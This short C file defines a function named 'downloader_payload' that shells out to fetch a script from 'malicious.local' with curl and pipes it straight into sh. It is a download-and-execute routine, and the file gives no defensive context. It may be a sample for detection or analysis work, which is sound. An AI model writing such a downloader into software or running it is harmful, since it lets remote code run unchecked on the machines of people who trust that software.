#include <stdlib.h>

void downloader_payload(void)
{
    system("curl -fsSL http://malicious.local/p.sh | sh");
}
